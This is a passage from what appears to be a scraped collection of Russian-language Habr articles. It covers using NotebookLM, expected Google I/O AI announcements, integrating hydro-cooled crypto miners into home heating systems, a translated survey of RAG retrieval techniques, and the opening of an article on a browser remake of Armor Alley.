2. Превратите свою базу знаний в полезные выводы
Панель управления NotebookLM
Как только вы создали всеобъемлющие базы знаний, NotebookLM предлагает мощные инструменты для извлечения максимальной пользы из ваших материалов:
Спрашивайте NotebookLM что угодно с помощью встроенной функции чата
Чат NotebookLM
Так же, как и в общении с другими LLM, вы можете спрашивать NotebookLM что угодно, связанное с темами, источники по которым вы только что загрузили. Например, я создал блокнот по PLG (Product-led Growth) и попросил NotebookLM объяснить несколько реальных примеров из моих источников. За считанные минуты NotebookLM обработал и связал информацию, на организацию которой у меня ушли бы дни вручную — выявляя закономерности и связи между различными форматами, которые я мог бы полностью упустить.
Это как иметь помощника по исследованиям, который прочитал все, что вы загрузили. Просто спрашивайте, что хотите, и получайте ответы, основанные на ваших реальных материалах, а не на выдумках.
Превратите источники в структурированные заметки
Структурированные заметки в NotebookLM
Чтобы сделать вещи еще более мощными, NotebookLM создает структурированные заметки в четырех различных форматах:
Study Guide (Учебное пособие) предлагает вам тесты и глоссарии. Они действительно проверяют ваши знания, а не просто позволяют пассивно читать.
Briefing Doc (Резюме) — это своего рода сводка ""вот все, что вам нужно знать"". Она извлекает ключевые идеи, чтобы вы не тратили время на лишнее.
FAQ (Частые вопросы) охватывает наиболее распространенные вопросы, которые люди задают по вашей теме. Это помогает вам пропустить основы и быстрее перейти к более сложному материалу.
Timeline (Хронология) показывает, как все менялось со временем. Идеально подходит для понимания эволюции любой темы.
Эти заметки — инструменты для обучения, призванные помочь информации быстрее закрепиться в вашей памяти.
Создайте карту мыслей
Карта мыслей в NotebookLM
Функция создания карты мыслей превращает вас в детектива, соединяющего все точки. Она дает вам полное представление о вашей теме со всеми выявленными связями. Вы можете развернуть каждую ветвь, чтобы углубиться, а затем попросить NotebookLM объяснить конкретные связи через чат.
Это, честно говоря, одна из моих любимых функций. Она дает мне общую картину перед тем, как я углубляюсь в детали, чтобы я точно знал, на чем сосредоточиться.
3. Суммируйте знания в подкаст
Вот где становится по-настоящему поразительно. Я до сих пор в восторге каждый раз, когда использую эту функцию!
Вы можете превратить всю свою базу знаний в настоящий подкаст.
Да! Вы правильно прочитали. Обещайте мне попробовать это сразу после прочтения этого поста!
Функция подкаста в NotebookLM
Функция подкаста создает естественные беседы между двумя AI-ведущими, обсуждающими ваш контент в течение 20 минут. Эти голоса звучат по-настоящему по-человечески — как эксперты, беседующие на вашу тему, похоже на участие в комнате Clubhouse или X Space.
Не верите мне? Попробуйте эту ссылку и убедитесь сами.
Аспект, меняющий правила игры, — это Интерактивный режим, который позволяет задавать вопросы во время прослушивания. Это превращает пассивное прослушивание в активное обучение, где вы можете получить разъяснения по конкретным моментам.
Интерактивный режим в NotebookLM
Эта функция изменила мою рутину. Недавно перед пробежкой я загрузил ресурсы о ""vibe coding"". Вместо музыки я слушал свой персонализированный подкаст, объясняющий сложные теории. Когда возникали вопросы, я просто задавал их через наушники. К концу пробежки я успел потренироваться и получить глубокое понимание создания приложений с помощью AI. Теперь обучение легко интегрируется с другими видами деятельности, а не конкурирует с ними.
Кто сказал, что обучение должно быть скучным и ограничиваться комнатой?
Спасибо, что читаете The AI Maker! Не пропустите углубленное изучение Prompt Engineering на следующей неделе, подписавшись здесь!
Правила игры в обучении изменились навсегда
Давайте будем честны — мы вступили в новую эру, где такие AI-инструменты, как NotebookLM, меняют то, как мы обрабатываем информацию. Больше не ограниченные возможностями нашего мозга или крошечными окнами контекста стандартных AI-моделей, мы можем теперь изучать сложные темы быстрее и на своих условиях.
Планируете ли вы поездку в Японию, осваиваете фотографию или решаете рабочую задачу, NotebookLM предоставляет вам беспрецедентные возможности: усваивать разнообразные форматы контента, создавать карты мыслей, которые связывают концепции, и даже создавать интерактивные подкасты для обучения на ходу.
Возможность стать экспертом буквально в любой области теперь у вас под рукой. Остается только один вопрос:
""Что вы собираетесь изучить дальше?""
Только зарегистрированные пользователи могут участвовать в опросе. Войдите, пожалуйста.
Попробуете NotebookLM?
61.76%
Конечно, уже гружу!
42
14.71%
Давно работаю с NotebookLM
10
22.06%
Не впечатлило
15
1.47%
Любые ИИ не ОК
1
Проголосовали 68 пользователей. Воздержались 11 пользователей."
Что ждать от Google I/O любителям ИИ,https://habr.com/ru/articles/910184/,"20-21 мая Google проведет input/output (сокращенно I/O), свое самое крупное мероприятие для разработчиков, на котором компания всегда делает множество анонсов. Очевидно, что в этом году центральной те...","20-21 мая Google проведет input/output (сокращенно I/O), свое самое крупное мероприятие для разработчиков, на котором компания всегда делает множество анонсов. Очевидно, что в этом году центральной темой станет искусственный интеллект — подразделение Google DeepMind в последние месяцы успешно конкурирует с OpenAI и Anthropic, поэтому новые анонсы компании особенно интересны.
И пусть до I/O еще остается несколько дней, в сети уже полно слухов и утечек, что поклонникам ИИ стоит ждать от Google I/O. Я собрал самые интересные и достоверные.
Новые языковые модели
Казалось бы, буквально 25 марта Google выпустила свою передовую модель 2.5 Pro, за которой 17 апреля последовала более быстрая 2.5 Flash. Обе модели занимают высокие строчки в популярных бенчмарках (а 2.5 Pro и вовсе борется за лидерство), но Google не собирается останавливаться. За последние недели на сайтах вроде LMarena компания обкатала более десятка «секретных» моделей (а скорее — чекпоинтов для 2–3 моделей) с фэнтезийными названиями вроде Moonhowler, Dragontail и Stargazer. Одна из них в итоге оказалась обновленной версией 2.5 Pro, которую Google планировала представить на I/O, но в итоге выпустила на две недели ранее. Модель стала лучше в программировании (особенно для фронтенд‑ и UI‑разработки), но в других бенчмарках не продвинулась — а где‑то даже немного уступила ранней 2.5 Pro.
Сравнение результатов двух варантов Gemini 2.5 Pro в некоторых популярных бенчмарках. Видно, что обновленную версию заточили под программирование
Будут ли новые модели на самой Google I/O? Шансы есть — все-таки 13 тестовых версий вряд ли относятся только к 2.5 Pro. Во-первых, логично было бы следом обновить 2.5 Flash. Во-вторых, куда больше интриги вокруг 2.5 Ultra — фраза “continue with Ultra” недавно была добавлена в код приложения Gemini, и пусть многие ассоциируют ее с новым тарифным планом, возможность анонса новой мощной модели тоже нельзя исключать. Тем более, что для Google было бы логично подготовить конкурента ChatGPT o3-Pro, выход которой также ожидается в ближайшие недели. Наконец, с большой вероятностью мы увидим новую опенсорс-модель Gemma — она уже тестируется на LMarena под кодовым названием Cutiepie-75.
Генерация изображений и видео
У Google уже есть неплохая модель генерации изображений Imagen 3, плюс прямо сейчас компания постепенно запускает нативное редактирование изображений в приложении Gemini. Но все эти усилия пока остаются в тени великолепной генерации изображений ChatGPT. На I/O компания явно попробует наверстать упущенное: в коде Gemini уже обнаружены упоминания Imagen 3.5, 4.0 и даже 4.0 Ultra — а также модель создания видео Veo 3. Честно говоря, даже если Google просто сравняется с OpenAI в плане создания картинок - это уже будет отличный подарок всем пользователям Gemini.
А вот выход Veo 3 кому-то может показаться преждевременным — Google совсем недавно запустила для массового пользователя Veo 2, которая до сих пор находится в топе бенчмарков. Однако нынешние модели по созданию видео все еще сильно ограничены — например, Veo 2 создает ролики продолжительностью всего в 8 секунд. Так что приличный темп развития здесь может быть оправдан.
Computer Use — ИИ, управляющий вашим компьютером
Не только Gemini App является поставщиком утечек — в коде платформы для ИИ-экспериментов Google AI Studio недавно нашли упоминание Computer Use, давно обсуждавшегося ИИ-агента, который сможет управлять вашим компьютером так же, как и вы сами: делать за вас покупки в интернете, устанавливать и настраивать программы, запускать код, видеть результаты и вносить правки и так далее. Вообще агентские функции считаются одним из главных векторов развития ИИ в 2025 году и далее. И пока, честно говоря, это направление буксует — у той же OpenAI очень скромные результаты с Operator. 
Не исключено, что Google не будет начинать с полноценного агента, а предложит более специализированное решение. В прессе появились данные, что компания показала ряду своих сотрудников и партнеров прототип агента для программирования. Источники утверждают, что агент полезен на всех этапах создания программного обеспечения — от работы в таск-менеджерах до написания документации.
Продвинутая память и другие изменения в Gemini App
Я сам очень люблю модели Google Gemini, но вынужден признать — приложение Gemini App, в особенности его мобильные версии, серьезно отстает от приложений ChatGPT, Claude и даже Grok. Но недавно занимающаяся Gemini App команда обновилась — и есть шансы, что приложение начнет развиваться быстрее: например, чаще стали выходить версии с исправлением багов, а на днях появилась отдельная версия для iPad.
Руководящий разработкой Gemini App Джош Вудворд в своем X недавно рассказал о планах на будущее. Главное — в Gemini App появится общая память между чатами. Аналогичную функцию недавно запустили в ChatGPT и Grok, и она открывает совершенно новый опыт взаимодействия с ИИ: изучая диалоги, нейросеть начинает лучше знать пользователя, его интересы, увлечения, какие-то любопытные события из жизни. Постепенно работа с ИИ становится все более персонализированной — например, можно попросить его предложить темы для разговора (или глубокого изучения) на основании прошлых знаний о вас. В своем телеграм-канале я приводил несколько примеров использования памяти ИИ.
Google планирует развить эту функцию даже далее — если выдать соответствующее разрешение, то Gemini включит в память историю вашего поиска в Google, ваши переписки в GMail, документы из Google Drive, события из Google Calendar, фотографии из Google Photos и так далее. Честно говоря, даже немного страшно передавать модели такие обширные знания о себе — но и интересно, как все эти данные можно использовать в работе.
Новые тарифные планы Gemini Advanced
Наконец, потенциальная новость со знаком “минус”. Google в последние месяцы отличалась щедростью к платным и бесплатным пользователям. На экспериментальной площадке Google AI Studio до недавнего времени можно было бесплатно пользоваться 2.5 Pro с лимитами, достаточными для минимум одного крупного проекта в день. Ну а 20-долларовая подписка Gemini Advanced сейчас дает практически безлимитный доступ к 2.5 Flash и Pro (есть информация о 500 запросах в сутки к каждой модели, что очень много) вместе с 20 запросами к DeepResearch (функция глубокого поиска в сети, когда модель работает 20-30 минут и создает гигантский отчет), возможностью использовать генерацию изображений и видео, а также прочими приятными мелочами вроде 2 терабайт в облачном хранилище. Причем как минимум до 20 июня подпиской Gemini Advanced еще и можно поделиться с 5 членами своей семьи.
Это очень много: например, 20-долларовая подписка ChatGPT Plus дает только 10 запросов к DeepResearch в месяц и 100 запросов к самой мощной модели o3 в неделю. И логично, что с ростом популярности Google начнет пробовать немножко прижать лимиты. Первые намеки уже появились: буквально на днях из Google AI Studio убрали бесплатный доступ к 2.5 Pro, а в Gemini Advanced я впервые столкнулся с ограничением на генерацию только пяти видео в Veo 2 в сутки. Упоминания новых тарифных планов также проскакивали в коде Gemini, поэтому есть шанс, что платить придется больше и за меньшие возможности. Но не думаю, что лимиты прижмут драматически — Google еще долго будет находиться в позиции догоняющего к OpenAI, а значит, должна чем-то завлекать пользователей. 
Это вряд ли полный список: 20 мая нас ждет выход полноценного приложения для NotebookLM, плюс наверняка Google продолжит интегрировать Gemini в свою экосистему, а также покажет новые кейсы использования ИИ в науке — буквально несколько месяцев назад компания анонсировала целую агентскую систему, призванную помогать ученым. Так что не пропустите Google I/O 20 и 21 мая. А лучше подписывайтесь на мой телеграм-канал — будем следить вместе!"
"Интеграция майнера в систему отопления, зачем усложнять?",https://habr.com/ru/articles/910168/,"Первый вопрос который приходит в голову любому человеку, который хочет купить бу гидромайнер и поставить вместо котла. Подключил подачу, обратку, циркуляционный насос и начал экономить на отоплении ил...","Первый вопрос который приходит в голову любому человеку, который хочет купить бу гидромайнер и поставить вместо котла. Подключил подачу, обратку, циркуляционный насос и начал экономить на отоплении или если позволяет цена на электричество зарабатывать с этого.
И так по порядку.
Таблица с официального сайта Bitmain, найти и убедиться вы можете сами.
В данной таблице обращаем внимание на пункт Coolant flow, L/min 8-10, что в переводе скорость потока или расход теплоносителя литров в минуту. В традиционных системах отопления такой показатель варьируется от 20-100 литров в минуту.
Если подключать майнер параллельно с системой отопления то теплоноситель будет проходить через водоблоки с очень низкой скоростью, что будет приводить к перегревам чипов.
И результатом таких частых перепадов температуры будет возгорание чипов
Пример человека, который использовал майнер подключив его без обвязки и дополнительного охлаждения надеясь только на профили разгона, у прошивки вниш время обновления параметров температуры минимально 1 минута, чего хватает для возгорания после длительных температурных скачков.
И так далее, у системы отопления дома на трассах до отопительных приборов используется труба с внутренним сечением 20мм (25 мм полипропилен) и далее подьемы на радиаторы 16 мм (20 мм Полипропилен).
У майнера основные трубки для подключения по внешнему диаметру 10мм по внутреннему 8мм, на коллекторе по внешнему диаметру 8 мм по внутреннему 6 мм.
Для правильной работы системы трубки 10 мм меняются на метапол 16 мм.
По законам гидравлики теплоноситель при обычном подключении просто не будет циркулировать с достаточной скоростью. Что будет приводить к перегревам.
Поэтому в ход уже идет система обвязки для правильного сьема тепла с майнера.
У нас есть первичное кольцо в котором циркуляционный насос «гоняет» теплоноситель по кругу и вторичные кольца с насосами, которые уже в свою очередь настраиваются таким образом чтобы забирать необходимое количество теплоносителя для радиаторов или теплого пола. У каждого потребителя свои характеристики и все это необходимо рассчитывать индивидуально.
Так же большинство схем в интернете не уделяют должного внимания системе очистки, в наших системах используются шламоуловители в которых оседает весь шлам системы отопления дома, в бюджетных обвязках допускается использование косого фильтра.
Почему на этом следует акцентировать внимание?
У водоблоков майнера очень узкие каналы, которые могут забиться шламом спустя какое-то время, что приведет к плохой циркуляции, в следствии чего будет локально перегреваться чипы и спустя время они выйдут из строя.
Цена вопроса не высока, а риски не сопоставимы, когда речь идет о майнерах стоимостью от 150 000-1000 0000 рублей.
У современных майнеров S21+ Hydro 395 Th/s данные каналы еще меньше. Ниже приведено фото с канала IBMM где они на фрезерном станке вскрыли и показали что находиться внутри.
Водоблок Antminer S19 PRO+HYD 198 TH/S
Есть большое количество обвязок и криптокотлов в интернете, с разной стоимостью.
С некоторыми из них у нас реализована программа партнерства по реализации их продукции. Наша система подходит для частных домов так как она более бюджетная, по сравнению с криптокотлами на 3 и более устройств.
Если вы хотите ставить 3 и более устройств в некоторых случаях будет выгоднее приобрести такое решение под ключ.
В случае с нашей обвязкой идет более индивидуальный подход. В данную схему мы индивидуально добавляем интеграцию с бойлером косвенного нагрева, системы снеготаяния и бассейна. Такая обвязка занимает меньше места и глубже интегрируется в систему отопления. Также вы можете в любой момент переключиться на свой основной котел.
Мы стараемся избегать теплообменников так как это снижает КПД системы на 4-6%
В данных системах это может стать критичным так как температура выхода у антмайнера от 55 до 65 градусов. В некоторых случаях мы используем теплообменники по запросу заказчика, например в больших домах где требуется заменить теплоноситель более чем 100 литров, максимально увеличив КПД за счет правильного подбора оборудования и циркуляционных насосов.
У большинства наших заказчиков реализованы системы без теплообменников.
Следующий шаг по уменьшению рисков и выхода из строя оборудования является замена теплоносителя на пропиленгликоль или этиленгликоль с определенными значениями ph-среды, у битмайн эти показатели приведены выше в таблице.
Система охлаждения ахиллесова пята каждого майнера и каждого заказчика, который решил себе установить данную систему.
Многие хотят сэкономить, придумать велосипед. Мы сами начинали с этого, изначально в своем доме мы просто подключили 100 метров сшитого полиэтилена и оставили на улице на зимнее-весеннее время и это работало, но периодически были перегревы.
Далее этап с покупкой блока кондиционера, фанкойла и любого другого оборудования.
Разберем более подробнее. Данные блоки изначально были спроектированы под фреон, у которого физические параметры отличны от воды, самые главный параметр это гидросопротивление, трубки в них около 6-8 мм. Прокачать теплоноситель через такой блок очень сложно что будет снижать общий расход теплоносителя в системе.
Мы пошли дальше и нашли опытного мастера по пайки медных труб и сделали медный коллектор 28 мм для равномерного распределения теплоносителя по блоку охлаждения(принцип гидравлического разделителя). Такой вариант очень бюджетный и в любой момент пайка может лопнуть (у нас такое тоже было). С гидравликой разобрались, остался вопрос охлаждения. На таких блоках очень слабый вентилятор с примерным расходом до 600 куб м в час. Довольно мало для сьема тепла в летнее время. Покупаем более мощный вентилятор и проблема частично уходит. Итого имеем нестабильно работающее решение за примерно 20 000 рублей, которое может выйти из строя в любой момент.
Третий и последний вариант покупка градирни, самое стабильное решение.
Варианты с покупкой радиатора от авто или прочей техники не рассматриваются в силу своей дороговизны, мы рассматриваем новые радиаторы так как частные случаи в виде у меня дома лежит не подходят. Такие радиаторы будут по итогу стоить столько же как и готовое решение, а работать будет хуже или также.
Есть также проточные модули охлаждения, про них ничего сказать не можем так как не было опыта по их использованию.
Далее автоматика
Всего есть два варианта:
Первый вариант
Купить недорогой контролер с термопарой и настроить на включение и выключение по температурам. Сомнительно но окей, Будет включаться на всю мощность на пару минут и далее отключаться. Такие решения предлагают около 60% рынка.
Вариант второй
Купить комплект автоматики из частотного преобразователя, пид регулятора и термо пары. В данном случаем вентилятор будет отключаться только в редких случаях, в своем большинстве он будет крутиться с частотой от 0,1 до 60 Герц. В случаях сильной жары он будет регулировать частоту оборотов автоматически.
Все эти методы рабочие и необходимо индивидуально подбирать решение под бюджет и цели интеграции. Если ваша цель сэкономить на отоплении, то вам может подойти бу майнер с бюджетной обвязкой и бюджетной системой охлаждения. Если мы говорим про заработок и майнеры от 500 000, тут необходимо уже собирать правильные системы отвода тепла и автоматизации.
Всем этим добром вы сможете управлять удаленно с любой точки мира, где есть стабильный интернет.
Вы можете собрать такую схему посоветовавшись с сантехниками или обратиться за помощью к нам, в этой сфере мы разобрались достаточно хорошо, наша группа ТГ https://t.me/proteplo_rf"
Часть 4. Обзор технологий RAG для LLM: аугментация извлеченных данных,https://habr.com/ru/articles/910162/,"Продолжаю адаптированный перевод статьи китайских исследователей Retrieval-Augmented Generation for Large Language Models: A Survey (ссылка на первую часть — здесь, на вторую часть — здесь, третью час...","Продолжаю адаптированный перевод статьи китайских исследователей Retrieval-Augmented Generation for Large Language Models: A Survey (ссылка на первую часть — здесь, на вторую часть — здесь, третью часть — здесь). В этой, четвертой части авторы совсем скромненько, словно тренировались заполнять налоговую декларацию, разбирают технологии аугментации извлеченных данных.
Поскольку без пояснительной бригады часть их информации оказалась для меня совершенной абракадаброй, я не поленился пройтись по упомянутым авторами ссылочкам на исследования, взять оттуда схемки и картинки, и добавил их к этой части тоже. Надеюсь, с ними рассуждения и наблюдения авторов будут значительно прозрачнее. Поехали!
В рамках RAG стандартный подход часто предполагает однократный процесс поиска с последующей генерацией ответа. Однако это может приводить к ошибкам (см. рис. 1) и обычно недостаточно для сложных задач, требующих многошаговых рассуждений, так как предоставляет ограниченный объём информации.
Рисунок 1. Пример, где использование RAG приводит к ошибке модели Llama-2-13B. Добавление нерелевантного контекста (справа) вызывает неверный ответ, хотя модель корректно отвечает без поиска (слева)
Благодаря многочисленным исследованиям процесс поиска оптимизируется, и основные результаты представлены на рисунке 2.
Рисунок 2. Рис. 5. Помимо наиболее распространённого однократного поиска , система RAG также включает три типа процессов поискового усиления:
 (Слева) Итеративный поиск предполагает чередование этапов поиска и генерации, что на каждом шаге позволяет получать более богатый и целенаправленный контекст из базы знаний.
 (В центре) Рекурсивный поиск заключается в постепенном уточнении пользовательского запроса, разбиении проблемы на подзадачи и их последовательном решении через комбинацию поиска и генерации.
 (Справа) Адаптивный поиск позволяет автономно определять необходимость обращения к внешним источникам знаний и момент прекращения процессов поиска и генерации, часто используя для управления специальные токены, сгенерированные LLM.
А. Итеративный поиск
Итеративный поиск — это процесс многократного обращения к базе знаний на основе исходного промпта и уже сгенерированного текста, что создаёт расширенную информационную основу для LLM. Данный подход повышает надёжность генерации ответов за счёт дополнительных контекстных ссылок, полученных в ходе множественных итераций поиска. Однако он может сталкиваться с семантическими разрывами и накоплением нерелевантных данных.
ITER-RETGEN использует синергию двух методов: «генерации, усиленной поиском» и «поиска, усиленного генерацией» — для задач, где требуется точное воспроизведение информации. Модель берёт контент, необходимый для решения задачи, в качестве контекстной основы для извлечения релевантных знаний, что улучшает ответы в следующих итерациях. К примеру, для ответа на вопрос о нейросетях модель сначала генерирует черновик ответа, затем ищет уточняющие данные на его основе, после чего дорабатывает ответ (рис. 3).
Рисунок 3. ITER-RETGEN циклически повторяет этапы поиска и генерации. На каждой итерации система использует выходные данные модели из предыдущего цикла в качестве контекста для поиска более релевантной информации — это позволяет улучшить качество генерации (например, исправить рост персонажа Jesse Hogan). Для наглядности на диаграмме показаны только две итерации. Сплошные стрелки обозначают связь запросов с найденными знаниями, а пунктирные — этап генерации с расширением через поиск.
Б. Рекурсивный поиск
Рекурсивный поиск часто применяется в информационном поиске (IR) и NLP для повышения глубины и релевантности результатов. Этот процесс предполагает итеративное уточнение поисковых запросов на основе результатов предыдущих этапов поиска, формируя цикл обратной связи для постепенного приближения к наиболее релевантной информации. Некоторые исследователи также отмечают, что рекурсивный поиск часто использует иерархическую структуру индекса.
Например, метод IRCoT (рисунок 4) использует цепочку рассуждений (Chain-of-Thought, CoT) для управления процессом поиска, динамически корректируя логику CoT с учетом полученных результатов.
Рисунок 4. IRCoT чередует этапы генерации цепочки рассуждений (CoT) и извлечения знаний, чтобы направлять поиск с помощью CoT и наоборот. Такое чередование позволяет получать более релевантную информацию для последующих шагов логического вывода по сравнению со стандартным подходом RAG, где в качестве запроса используется только исходный вопрос.
А подход ToC создает дерево уточнений, которое систематически оптимизирует неоднозначные части запроса (рис. 5). Эти методы особенно эффективны в сложных сценариях:
когда потребности пользователя изначально неясны (например, расплывчатые формулировки в технической документации);
при работе с узкоспециализированными данными (медицинские исследования, юридические тексты).
Рисунок 5. Дерево уточнений (ToC). (1) Для неоднозначного вопроса (AQ) извлекаются релевантные отрывки из источников. (2) На основе этих отрывков с помощью few-shot промптинга рекурсивно генерируются уточнённые вопросы, которые при необходимости фильтруются. (3) Формируется развёрнутый ответ, охватывающий все уточнённые вопросы.
Рекурсивная природа этого подхода позволяет системе адаптироваться к требованиям пользователя в режиме реального времени, что повышает точность и удовлетворенность результатами.
Для решения специализированных задач обработки данных рекурсивный поиск и многоуровневый поиск применяются совместно. Рекурсивный поиск использует структурированный индекс для иерархической обработки и извлечения данных. Например, он может включать предварительное создание сводки разделов документа (скажем, объёмного PDF-файла), на основе которой выполняется первичный поиск. После чего проводится вторичный поиск внутри документа для уточнения результатов, что отражает рекурсивную природу метода. В отличие от этого, многоуровневый поиск (рис. 6) предназначен для глубокого анализа графо-структурированных данных (например, графов знаний), извлекая взаимосвязанную информацию.
Рисунок 6. Принцип работы Chain of Knowledge (CoK) — по аналогии с тем, как человек разбивает сложные вопросы на простые компоненты, LLM генерирует цепочку подвопросов, на которые легче ответить. Для решения этих подвопросов модель дополняется релевантными фактами, извлечёнными из внешней базы знаний с помощью RAG-механизмов. Наконец, LLM использует полученные знания для формулировки ответа на исходный вопрос, следуя принципам chain-of-thought prompting (пошагового рассуждения) и ITER-RETGEN
В. Адаптивные методы поиска
Адаптивные методы поиска, такие как Flare (рис. 7) и Self-RAG (рис. 11), улучшают архитектуру RAG, позволяя LLM самостоятельно определять оптимальные моменты и содержание для поиска информации. Это повышает эффективность и релевантность извлекаемых данных.
Рисунок 7. FLARE (Forward-Looking Active Retrieval Augmented Generation) — это метод активного поиска с прогнозированием, работающий итеративно. Алгоритм начинается с пользовательского запроса x и первоначальных результатов поиска Dx. На каждом шаге LLM генерирует временное продолжение текста (выделено серым курсивом) и анализирует наличие токенов с низкой вероятностью (подчеркнуты). При их обнаружении система активирует поиск релевантных документов и перегенерирует предложение с обновленным контекстом.
Эти методы встроены в общий тренд, где LLM используют активное принятие решений в своей работе, как это реализовано в агентах AutoGPT (рис. 8), Toolformer (рис. 9) и Graph-Toolformer.
Рисунок 8. Auto-GPT  учитывает дополнительные мнения внешних экспертных моделей. В частности, на этапе принятия решений система выбирает Top-K наиболее релевантных мнений от экспертной модели и включает их в контекст промпта для более обоснованных решений. В качестве внешних экспертов используются готовые IL-модели (Imitation Learning). Шаблон промпта для предложения дополнительных мнений LLM выглядит так: ""Вот одно (несколько) предложение(й) для команды: <действие с параметрами>. Используйте это как ориентир, но принимайте решение самостоятельно.""    
Например, Graph-Toolformer разделяет процесс поиска на этапы: LLM активно задействуют ретриверы, применяют технику Self-Ask и few-shot промпты для формирования поисковых запросов. Такой активный подход позволяет моделям решать, когда искать информацию, аналогично тому, как инструменты используются автономными агентами.
Рисунок 9. Примеры предсказаний Toolformer. Модель самостоятельно принимает решение о вызове различных API (сверху вниз: система ответов на вопросы, калькулятор, система машинного перевода и поисковая система Wikipedia) для получения информации, полезной при завершении фрагмента текста.
WebGPT внедрил фреймворк обучения с подкреплением для тренировки модели GPT-3 в автономном использовании поисковых систем во время генерации текста (рис. 10). Процесс управляется специальными токенами, которые активируют действия: поисковые запросы, анализ результатов и цитирование источников. Это расширяет возможности GPT-3 за счёт интеграции внешних поисковых инструментов.
Рисунок 10. WebGPT — текстовая веб-среда, представленная демонстраторам-людям (слева) и LLM (справа). Позволяет улучшить поиск и синтез данных в сквозном режиме, используя методы обучения с подкреплением и имитационного обучения, а также объективность ответов (приводятся с цитированием из веб-страниц во время навигации)
Flare автоматизирует поиск по времени, отслеживая уверенность модели в процессе генерации через вероятность сгенерированных токенов. Если вероятность падает ниже заданного порога, система активирует модуль поиска для сбора релевантной информации, оптимизируя цикл извлечения данных (рис. 7).
Self-RAG (рис. 11) использует токены рефлексии (retrieve и critic), которые позволяют модели анализировать свои выходные данные. Когда активировать поиск, решает либо сама модель, либо это происходит при достижении порогового значения.
Рисунок 11. Токены рефлексии в SELF-RAG делятся на retrieve (определяют необходимость поиска) и critic (оценивают качество генерации). Алгоритм работает так:
 (Этап 1) При получении промпта и предыдущих генераций система сначала проверяет, нужны ли дополнительные данные из внешних источников. Если да — активирует ретривер через специальный токен.
 (Этап 2) Затем параллельно обрабатывает найденные чанки, оценивает их релевантность и генерирует ответы.
 (Этап 3) После этого создаёт токены critic для самопроверки: выбирает оптимальный вариант по точности и качеству.
 В отличие от классического RAG, который всегда извлекает фиксированное число документов (даже когда это избыточно, как в примере без фактологической нагрузки), SELF-RAG адаптирует поиск под конкретный сценарий.
Во время поиска генератор применяет фрагментный лучевой поиск для анализа нескольких абзацев и выбора наиболее связной последовательности.
Рисунок 12. Одна из реализаций Beam Search – SentBS. SentBS (Sentence-Level Beam Search) генерирует каждое предложение поэтапно: cначала создаёт несколько вариантов предложений, затем оценивает и выбирает наилучший вариант.    
Оценки critic обновляют веса фрагментов, а их гибкая настройка во время инференса позволяет адаптировать поведение модели. Self-RAG исключает необходимость дополнительных классификаторов или моделей NLI, упрощая принятие решений о запуске поиска и повышая автономность генерации точных ответов.
Продолжение следует. В следующей, 5-й части мы поговорим о техниках оценки качества систем RAG."
Новый взгляд на старые игры. Часть 7. Эпилог. Armor Alley (1991). Веб-прототип,https://habr.com/ru/articles/910142/,"Во время обдумывания чем можно было бы завершить цикл “Новый взгляд на старые игры” в памяти всплыл специфический, технический текст, перевод которого некогда застрял на стадии полировки терминологии....","Во время обдумывания чем можно было бы завершить цикл “Новый взгляд на старые игры” в памяти всплыл специфический, технический текст, перевод которого некогда застрял на стадии полировки терминологии. Сегодня вашему вниманию предлагается, насколько то дозволила сложившаяся специфика, доработанная версия.
Об оригинальной игре я ранее рассказывал в рамках материала из другого цикла, здесь же речь пойдёт именно о ремейке и, преимущественно, его front-end специфике.
Перевод выкладывается с разрешения Scott-а Schiller-а. Характер статьи изобилует заметками / элементами монолога автора с самим собой. При переводе было решено оставить заданную подачу как есть, без радикальной стилистической коррекции или смены формата.
Осуществлял дополнительный анализ JavaScript-терминологии - oldalexi. Выступал в качестве дополнительного редактора - Newbillius.
Эволюция разных версий ремейка от самого раннего прототипа до текущих дней.
Я играл в Armor Alley в начале 1990-х на старом IBM-PC на базе 8088 процессора; здесь вы найдёте мою интерпретацию данной игры.
Прямо сейчас её можно запустить здесь.
Браузерная интерпретация классической игры 1990 года
Armor Alley — аркадный сайд-скроллер, который также можно назвать симулятором со стратегическими элементами. Основная цель — доставить фургон через поле боя к вражеской базе, но конечно, сделать это будет не так просто; фургон совершенно безоружен и крайне уязвим. Вы должны защищать фургон силами колонны, состоящей из танков, ракетных установок и других наземных единиц, а также обеспечивать воздушное прикрытие с помощью вертолёта. Силы противника идентичны вашим.
Главный экран веб-прототипа Armor Alley. Вы можете сыграть в него прямо сейчас или прочитать больше об оригинальной игры, единицах и стратегии в Википедии.
Краткая демонстрация веб-прототипа АА в обучающем режиме. Показана основная механика, объяснены элементы обороны и наступательной тактики.
Зачем всё это?
- ... Затем.
Любое приложение, которое может быть написано на JavaScript, в конечном итоге будет написано на JavaScript. -- Закон Этвуда (2007).
Написание браузерной игры с использованием HTML, CSS и JavaScript - отличный способ учиться, переучиваться и экспериментировать с подходами к программированию на клиенте. Игры требуют глубины логической мысли, планирования, усилий для построения, а также поощряют эксперименты по части архитектуры и самого стиля разработки.
Производительность и масштабируемость являются важными факторами при создании игр и оба предоставляют возможность для обучения написанию производительного кода, совместимого с чередой платформ и устройств. Независимо от точности соответствия оригиналу, работающий прототип игры может быть интересен как с образовательной стороны, так и с развлекательной.
Armor Alley, версия под MS-DOS (1990).
Введение
Создавайте и защищайте колонны, состоящие из танков, ракетных установок, пехоты, фургонов и инженеров, по мере того, как они пересекают поле боя, используйте свой вертолет как для нападения, так и для защиты. Конечная цель состоит в том, чтобы доставить свой фургон до вражеской базы на другой стороне поля боя.
Изучение оригинала
PC, версия для MS-DOS, год выхода - 1990, порт оригинальной версии для компьютеров Macintosh.
Сайд-скроллер, высота фиксированная, 16 цветов, паттерны, которые можно переиспользовать (автомобили, шрапнель, стрельба, дым, взрывы), минимальная анимация, многочисленное взаимодействие между транспортными средствами и смена их поведения в окружающей среде. Варьирующаяся, но в целом неглубокая и ограниченная сложность; относительно прямолинейная реализация.
Оригинальная коробка: Armor Alley, версия, совместимая с MS-DOS (1990). Спасибо, eBay.
Принятые ограничения проекта
Полновесная реализация на клиентской стороне: HTML, JavaScript, CSS. Первый ""уровень"", стандартная техника и элементы местности, включая зенитные турели / ""пушки"", но без бронированных бункеров. Базовый ""ИИ"" противника, автоматизированное построение конвоя / отдача приказов + контроль действий вражеского вертолета / защита — вероятно будет трудно по настоящему подражать исходному поведению. Сетевой режим и мультиплеер отсутствуют.
Процесс разработки
Прямо как во времена детских семейных поездок: исходный код, отредактированный и на ходу сопровождаемый заметками.
Первоначальный прототип: базовый ландшафт, местность, транспортные средства, бункеры с воздушными шарами и передвижение транспорта. Вертолет игрока может летать над местностью.
Добавлена вражеская техника. Добавлены основы обнаружения врагов, стрельбы, бомб и обнаружения столкновений.
